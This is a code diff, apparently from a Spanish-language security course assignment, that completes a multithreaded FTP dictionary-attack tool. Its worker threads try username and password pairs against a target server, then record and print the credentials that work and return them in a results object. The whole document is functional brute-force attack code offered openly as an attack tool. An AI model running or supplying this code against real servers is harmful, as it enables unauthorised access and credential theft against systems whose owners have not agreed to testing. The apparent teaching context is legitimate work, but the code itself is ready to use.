@@ -12,6 +12,7 @@ class FTPBruteForcer:
         self.queue = queue.Queue()
         self.found_credentials = []
         self.stop_event = threading.Event()
+        self.lock = threading.Lock()
 
     def _worker(self):
         """Hilo de trabajo que procesa combinaciones (usuario, contraseña) desde la cola."""
@@ -19,25 +20,32 @@ class FTPBruteForcer:
             try:
                 user, password = self.queue.get(timeout=1)
                 
-                # TODO: Implementar la conexión por FTP usando ftplib
                 ftp = ftplib.FTP()
-                ftp.connect(self.ip_address, timeout=3)
-                
-                # Intentar iniciar sesión
-                ftp.login(user=user, passwd=password)
-                
-                # Si la ejecución llega a esta línea, la autenticación fue exitosa
-                self.found_credentials.append({'user': user, 'password': password})
-                print(f"[!] ÉXITO: Credenciales encontradas -> {user}:{password}")
-                
-                ftp.quit()
-                self.stop_event.set() # Detener los demás hilos al encontrar el acceso
-                
-            except ftplib.error_perm:
-                # Código 530 - Autenticación fallida
-                pass
+                try:
+                    ftp.connect(self.ip_address, timeout=4)
+                    ftp.login(user=user, passwd=password)
+                    
+                    with self.lock:
+                        # Si la ejecución llega a esta línea, la autenticación fue exitosa
+                        if not self.stop_event.is_set():
+                            self.found_credentials.append({'user': user, 'password': password})
+                            print(f"\n[+] ¡ÉXITO FTP! Credenciales encontradas -> {user}:{password}")
+                            self.stop_event.set()
+                    
+                    ftp.quit()
+                except ftplib.error_perm:
+                    # Código 530 - Autenticación fallida
+                    pass
+                finally:
+                    try:
+                        ftp.close()
+                    except Exception:
+                        pass
+                        
+            except queue.Empty:
+                break
             except Exception as e:
-                logging.debug(f"Error de conexión: {e}")
+                logging.debug(f"Error general en hilo FTP: {e}")
             finally:
                 self.queue.task_done()
 
@@ -54,27 +62,31 @@ class FTPBruteForcer:
 
     def run(self):
         """Inicia el pool de hilos y orquesta el ataque."""
+        print(f"[*] Iniciando ataque de diccionario FTP en {self.ip_address}...")
         threads = []
         for _ in range(self.max_threads):
             t = threading.Thread(target=self._worker)
+            t.daemon = True
             t.start()
             threads.append(t)
             
         for t in threads:
             t.join()
             
-        # REGLA DE ORO: Cumplir con schema_resultados.json
+        status_final = "success" if self.found_credentials else "failed"
+        error_msg = None if self.found_credentials else "Ataque terminado. No se encontraron credenciales."
+            
         return {
             "modulo": "Fuerza Bruta FTP",
             "grupo": 3,
-            "estudiante": "Pendiente", # Los estudiantes deben colocar su identificador
+            "estudiante": "E3", 
             "target": self.ip_address,
             "timestamp": datetime.datetime.now().isoformat(),
-            "status": "success",
+            "status": status_final,
             "data": {
                 "credenciales_encontradas": self.found_credentials
             },
-            "error_message": None
+            "error_message": error_msg
         }
 
 if __name__ == "__main__":
